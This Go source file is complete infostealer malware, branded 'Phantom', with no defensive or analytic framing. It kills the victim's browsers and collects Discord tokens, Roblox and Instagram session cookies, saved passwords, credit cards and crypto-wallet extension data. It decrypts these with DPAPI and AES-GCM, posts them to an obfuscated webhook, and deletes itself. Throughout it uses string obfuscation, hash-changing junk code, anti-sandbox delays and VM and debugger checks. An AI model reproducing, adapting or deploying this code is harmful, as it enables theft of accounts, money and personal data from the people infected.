package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	WebhookURL string // Now obfuscated
	Timestamp  string
)

// d decrypts strings using XOR and Base64
func d(s string) string {
	if s == "" {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return s
	}
	key := byte(0x50) // PHANTOM KEY
	res := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		res[i] = data[i] ^ key
	}
	return string(res)
}

// Junk function to confuse static analysis and change hash
func junk() {
	a := 0
	for i := 0; i < 1000; i++ {
		a += i
		if a%2 == 0 {
			a -= 1
		}
	}
}

// CPU Delay to bypass sandboxes that skip time.Sleep
func antiSandboxDelay(seconds int) {
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for time.Now().Before(end) {
		junk() // Burn cycles
	}
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SystemReport struct {
	Username      string      `json:"username"`
	Hostname      string      `json:"hostname"`
	OS            string      `json:"os"`
	Arch          string      `json:"arch"`
	CPUs          int         `json:"num_cpu"`
	MemTotal      uint64      `json:"mem_total"`
	PublicIP      string      `json:"public_ip"`
	DiscordTokens []TokenInfo `json:"discord_tokens"`
	RobloxCookies []string    `json:"roblox_cookies"`
	InstaCookies  []string    `json:"insta_cookies"`
	Passwords     []Password  `json:"passwords"`
	CreditCards   []Card      `json:"credit_cards"`
	RawCookies    []Cookie    `json:"raw_cookies"`
	WalletsFound  []string    `json:"wallets_found"`
	Browsers      []string    `json:"browsers_found"`
	Timestamp     string      `json:"timestamp"`
}

type Password struct {
	URL      string `json:"url"`
	Username string `json:"user"`
	Password string `json:"pass"`
}

type Card struct {
	Number string `json:"number"`
	Month  string `json:"month"`
	Year   string `json:"year"`
	Name   string `json:"name"`
}

type TokenInfo struct {
	Token    string `json:"token"`
	Source   string `json:"source"`
	Username string `json:"user"`
	ID       string `json:"id"`
	Email    string `json:"email"`
	Phone    string `json:"phone"`
	Nitro    string `json:"nitro"`
	Badges   string `json:"badges"`
}

func getDiscordInfo(token string, source string) TokenInfo {
	info := TokenInfo{Token: token, Source: source, Username: "Invalid", Nitro: "None"}
	client := &http.Client{Timeout: 5 * time.Second}
	// Obfuscated: https://discord.com/api/v9/users/@me
	u := d("OCQkICNqf380OSMzPyI0fjM/PX8xIDl/Jml/JSM1IiN/ED01")
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", token)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return info
	}
	defer resp.Body.Close()
	var res map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&res)

	info.Username = fmt.Sprintf("%v#%v", res["username"], res["discriminator"])
	info.ID = fmt.Sprintf("%v", res["id"])
	if res["email"] != nil {
		info.Email = fmt.Sprintf("%v", res["email"])
	}
	if res["phone"] != nil {
		info.Phone = fmt.Sprintf("%v", res["phone"])
	}

	// Simple Nitro check
	if res["premium_type"] != nil {
		pType := res["premium_type"].(float64)
		if pType == 1 {
			info.Nitro = "Nitro Classic"
		} else if pType == 2 {
			info.Nitro = "Nitro Boost"
		}
	}

	return info
}

func main() {
	// Anti-AV: Random delay to bypass some emulators
	rand.Seed(time.Now().UnixNano())
	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)

	// Webhook is already obfuscated at compile time
	WebhookURL = d(WebhookURL)

	if WebhookURL == "" {
		return
	}

	// Anti-analysis checks removed as requested to ensure it works everywhere (including VMs)

	closeBrowsers()
	report := initSession()
	syncData(report)
	selfDelete()
}

func validateEnv() bool {
	home, _ := os.UserHomeDir()
	docs := filepath.Join(home, "Documents")
	files, err := os.ReadDir(docs)
	if err != nil {
		return true // Fallback
	}
	// Real users usually have more than a few files in Documents
	if len(files) < 3 {
		return false
	}
	return true
}

func selfDelete() {
	if runtime.GOOS == "windows" {
		exePath, _ := os.Executable()
		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
		subprocess := exec.Command("cmd", "/C", cmd)
		subprocess.Start()
	} else {
		os.Remove(os.Args[0])
	}
}

func closeBrowsers() {
	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
	for _, browser := range browsers {
		// taskkill /F /IM <browser> /T
		cmd := exec.Command(d("JDEjOzs5PDw="), d("fxY="), d("fxkd"), browser, d("fwQ="))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
}

func initSession() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		MemTotal:  getTotalMemory(),
		PublicIP:  getPublicIP(),
		Timestamp: time.Now().Format(time.RFC3339),
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.InstaCookies = extractInstagramCookies()
	report.Passwords = extractPasswords()
	report.CreditCards = extractCreditCards()
	report.WalletsFound = extractWallets()
	report.Browsers = findBrowsers()

	return report
}

func extractWallets() []string {
	var found []string
	home, _ := os.UserHomeDir()

	walletExtensions := map[string]string{
		"MetaMask":        "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":         "bfnaoagmocialkllpicneheihdpfeegk",
		"Trust Wallet":    "egjidjbpglicholopmhbhfggpidxpnoo",
		"Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Binance Wallet":  "fhbohimaelbohpjbbldcngcnapndodjp",
		"Exodus":          "idmifokndgbbpmoamneicnepkbhfbkeo",
	}

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for browserName, basePath := range browserPaths {
		profiles := []string{"Default", "Guest Profile"}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			for walletName, extensionID := range walletExtensions {
				extPath := filepath.Join(basePath, profile, "Local Extension Settings", extensionID)
				if _, err := os.Stat(extPath); err == nil {
					zipName := fmt.Sprintf("%s_%s_%s.zip", browserName, profile, walletName)
					zipData, err := zipFolderToMemory(extPath)
					if err == nil {
						sendAsFileCustom(zipData, zipName, fmt.Sprintf("🔑 **%s Wallet Found (%s - %s)**", walletName, browserName, profile))
						found = append(found, fmt.Sprintf("%s (%s/%s)", walletName, browserName, profile))
					}
				}
			}
		}
	}

	return found
}

func zipFolderToMemory(source string) ([]byte, error) {
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)

	err := filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		f, err := w.Create(relPath)
		if err != nil {
			return err
		}
		fileContent, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		_, err = f.Write(fileContent)
		return err
	})

	w.Close()
	return buf.Bytes(), err
}

func sendAsFileCustom(data []byte, filename string, content string) {
	if WebhookURL == "" {
		return
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	part.Write(data)
	writer.WriteField("content", content)
	writer.Close()
	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}

func getTotalMemory() uint64 {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
		var mem uint64
		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
		if ret != 0 {
			return mem * 1024
		}
	}
	return 0
}

func isSandbox() (bool, string) {
	// 1. Check Username
	currUser, err := user.Current()
	if err == nil && currUser != nil {
		username := strings.ToLower(currUser.Username)
		badUsers := []string{
			"wdagutilityaccount", "abby", "peter wilson", "hjohnson", "john doe", "malware", "virus", "sandbox",
		}
		for _, u := range badUsers {
			if strings.Contains(username, u) {
				return true, "u"
			}
		}
	}

	// 2. Check Hostname
	hostname, err := os.Hostname()
	if err == nil {
		hostname = strings.ToLower(hostname)
		badHosts := []string{
			"wasp", "mqftn", "sandbox", "malware", "vmware", "vbox",
		}
		for _, h := range badHosts {
			if strings.Contains(hostname, h) {
				return true, "h"
			}
		}
	}

	// 3. VM files check
	files := []string{
		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWbW1vdXNlLnN5cw=="), // C:\windows\System32\Drivers\Vmmouse.sys
		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWYm94Z3Vlc3Quc3lz"), // C:\windows\System32\Drivers\Vboxguest.sys
	}
	for _, f := range files {
		if _, err := os.Stat(f); err == nil {
			return true, "f"
		}
	}

	// 4. Check Public IP (Common sandbox IPs)
	ip := getPublicIP()
	if ip != "Unknown" {
		badIPs := []string{"185.44.177.5", "34.59.159.11", "88.66.98.103"}
		for _, bIP := range badIPs {
			if ip == bIP {
				return true, "i"
			}
		}
	}

	return false, ""
}

func isDebugger() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	if isDebuggerPresent.Find() != nil {
		return false // Fallback if proc not found
	}
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
	}

	for name, path := range browserPaths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}

	return found
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	// Obfuscated: https://api.ipify.org
	resp, err := client.Get(d("OCQkICNqf38xIDl+OSA5Nil+PyI3"))
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func extractDiscordTokens() []TokenInfo {
	var tokens []string
	var tokenInfos []TokenInfo
	home, _ := os.UserHomeDir()

	// Chromium-based browsers base paths
	browserPaths := map[string]string{
		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord"),
		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary"),
	}

	re := regexp.MustCompile(`[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}`)
	encRe := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\x22]*`)

	for name, basePath := range browserPaths {
		if _, err := os.Stat(basePath); err != nil {
			continue
		}

		// Profiles to check
		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		var masterKey []byte
		if name == "Discord" || name == "Discord Canary" {
			masterKey, _ = getMasterKey(basePath)
		}

		for _, profile := range profiles {
			var path string
			if name == "Discord" || name == "Discord Canary" || name == "Opera" || name == "Opera GX" {
				path = filepath.Join(basePath, "Local Storage", "leveldb")
			} else {
				path = filepath.Join(basePath, profile, "Local Storage", "leveldb")
			}

			if _, err := os.Stat(path); err == nil {
				filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
					if err != nil || info.IsDir() {
						return nil
					}
					if !strings.HasSuffix(p, ".log") && !strings.HasSuffix(p, ".ldb") {
						return nil
					}
					content, _ := os.ReadFile(p)

					// Plaintext tokens
					matches := re.FindAllString(string(content), -1)
					for _, token := range matches {
						if !contains(tokens, token) {
							tokens = append(tokens, token)
							info := getDiscordInfo(token, name)
							if info.Username != "Invalid" {
								tokenInfos = append(tokenInfos, info)
							}
						}
					}

					// Encrypted tokens (Discord Desktop)
					if masterKey != nil {
						encMatches := encRe.FindAllString(string(content), -1)
						for _, encToken := range encMatches {
							encToken = strings.Split(encToken, "dQw4w9WgXcQ:")[1]
							decoded, _ := base64.StdEncoding.DecodeString(encToken)
							decrypted, err := decryptToken(decoded, masterKey)
							if err == nil {
								if !contains(tokens, decrypted) {
									tokens = append(tokens, decrypted)
									info := getDiscordInfo(decrypted, name)
									if info.Username != "Invalid" {
										tokenInfos = append(tokenInfos, info)
									}
								}
							}
						}
					}
					return nil
				})
			}
		}
	}

	// Scan Firefox
	firefoxPath := filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(firefoxPath); err == nil {
		filepath.Walk(firefoxPath, func(p string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			// Firefox stores data in .sqlite or storage/default leveldb-like files
			ext := filepath.Ext(p)
			if ext == ".sqlite" || ext == ".log" || ext == ".ldb" || strings.Contains(p, "storage") {
				content, _ := os.ReadFile(p)
				matches := re.FindAllString(string(content), -1)
				for _, token := range matches {
					if !contains(tokens, token) {
						tokens = append(tokens, token)
						info := getDiscordInfo(token, "Firefox")
						if info.Username != "Invalid" {
							tokenInfos = append(tokenInfos, info)
						}
					}
				}
			}
			return nil
		})
	}

	return tokenInfos
}

func contains(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

func extractRobloxCookies() []string {
	results := extractRobloxCookiesFromDat()
	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")                      // ROBLOSECURITY XOR 0x42
	browserCookies := ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42

	for _, c := range browserCookies {
		if !contains(results, c) {
			results = append(results, c)
		}
	}
	return results
}

func extractRobloxCookiesFromDat() []string {
	var results []string
	home, _ := os.UserHomeDir()
	// Obfuscated path: AppData\Local\Roblox\LocalStorage\RobloxCookies.dat
	// "AppData\Local\Roblox\LocalStorage\RobloxCookies.dat" XOR 0x50 -> Base64
	p := d("ESAgFDEkMQwcPzMxPAwCPzI8PygMHD8zMTwDJD8iMTc1DAI/Mjw/KBM/Pzs5NSN+NDEk")
	path := filepath.Join(home, p)

	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return results
	}

	if len(data) == 0 {
		return results
	}

	decrypted, err := decryptDPAPI(data)
	if err == nil {
		cookieStr := string(decrypted)
		// Roblox cookies usually start with _|WARNING:-DO-NOT-SHARE-
		if strings.Contains(cookieStr, "_|WARNING") {
			results = append(results, cookieStr)
		} else if len(cookieStr) > 100 {
			// Some versions might not have the warning but are still valid tokens
			results = append(results, cookieStr)
		}
	}
	return results
}

func extractPasswords() []Password {
	var results []Password
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			path := filepath.Join(basePath, profile, "Login Data")
			if _, err := os.Stat(path); err == nil {
				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_p_%d", time.Now().UnixNano()))
				if copyFile(path, temp) != nil {
					continue
				}
				content, _ := os.ReadFile(temp)
				os.Remove(temp)

				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
				for _, match := range v10Matches {
					decrypted, err := decryptToken(match, masterKey)
					if err == nil && len(decrypted) > 0 {
						results = append(results, Password{
							URL:      "Browser",
							Username: "Unknown",
							Password: decrypted,
						})
					}
				}
			}
		}
	}
	return results
}

func extractCreditCards() []Card {
	var results []Card
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			path := filepath.Join(basePath, profile, "Web Data")
			if _, err := os.Stat(path); err == nil {
				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_w_%d", time.Now().UnixNano()))
				if copyFile(path, temp) != nil {
					continue
				}
				content, _ := os.ReadFile(temp)
				os.Remove(temp)

				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
				for _, match := range v10Matches {
					decrypted, err := decryptToken(match, masterKey)
					if err == nil && len(decrypted) > 0 {
						results = append(results, Card{
							Number: decrypted,
							Name:   "Browser Card",
						})
					}
				}
			}
		}
	}
	return results
}

func extractInstagramCookies() []string {
	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
}

func ultimateGrabber(domain string, targetCookie string) []string {
	var results []string
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			cookiePath := filepath.Join(basePath, profile, "Network", "Cookies")
			if _, err := os.Stat(cookiePath); err != nil {
				cookiePath = filepath.Join(basePath, profile, "Cookies")
			}

			if _, err := os.Stat(cookiePath); err == nil {
				tempCookies := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_c_%d", time.Now().UnixNano()))
				err := copyFile(cookiePath, tempCookies)
				if err != nil {
					continue
				}
				content, _ := os.ReadFile(tempCookies)
				os.Remove(tempCookies)

				searchTerms := []string{domain, targetCookie}
				for _, term := range searchTerms {
					idx := 0
					for {
						foundIdx := strings.Index(string(content[idx:]), term)
						if foundIdx == -1 {
							break
						}
						actualIdx := idx + foundIdx
						idx = actualIdx + len(term)

						start := actualIdx - 500
						if start < 0 {
							start = 0
						}
						end := actualIdx + 1500
						if end > len(content) {
							end = len(content)
						}
						searchArea := content[start:end]

						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
						for _, v10Match := range v10Matches {
							decrypted, err := decryptToken(v10Match, masterKey)
							if err == nil && len(decrypted) > 10 {
								// Validation: either it's a Roblox cookie with the warning, or another cookie
								if targetCookie == "ROBLOSECURITY" {
									if strings.Contains(decrypted, "_|WARNING") {
										if !contains(results, decrypted) {
											results = append(results, decrypted)
										}
									}
								} else {
									if !contains(results, decrypted) {
										results = append(results, decrypted)
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return results
}

func getMasterKey(basePath string) ([]byte, error) {
	localStatePath := filepath.Join(basePath, "Local State")
	if _, err := os.Stat(localStatePath); err != nil {
		return nil, err
	}

	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(content, &state); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	if !bytes.HasPrefix(encryptedKey, []byte("DPAPI")) {
		return nil, fmt.Errorf("invalid key prefix")
	}

	keyOnly := encryptedKey[5:]
	return decryptDPAPI(keyOnly)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	type dataBlob struct {
		cbData uint32
		pbData *byte
	}

	var (
		dll             = syscall.NewLazyDLL("crypt32.dll")
		procDecryptData = dll.NewProc("CryptUnprotectData")
		in              dataBlob
		out             dataBlob
	)

	in.cbData = uint32(len(data))
	in.pbData = &data[0]

	ret, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)

	if ret == 0 {
		return nil, err
	}

	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.pbData)))

	res := make([]byte, out.cbData)
	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return res, nil
}

func decryptToken(data []byte, key []byte) (string, error) {
	if len(data) < 15 {
		return "", fmt.Errorf("data too short")
	}

	nonce := data[3:15]
	ciphertext := data[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()
	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	return err
}

func syncData(report SystemReport) {
	jsonData, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return
	}

	if len(jsonData) > 1800 {
		sendAsFile(jsonData)
		return
	}

	payload := map[string]interface{}{
		"content":  "```json\n" + string(jsonData) + "\n```",
		"username": "Phantom JSON Logger",
	}

	body, _ := json.Marshal(payload)
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

func sendAsFile(data []byte) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", "phantom_report.json")
	if err == nil {
		part.Write(data)
	}
	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
	writer.Close()

	req, err := http.NewRequest("POST", WebhookURL, body)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	client := &http.Client{
		Timeout: 45 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}
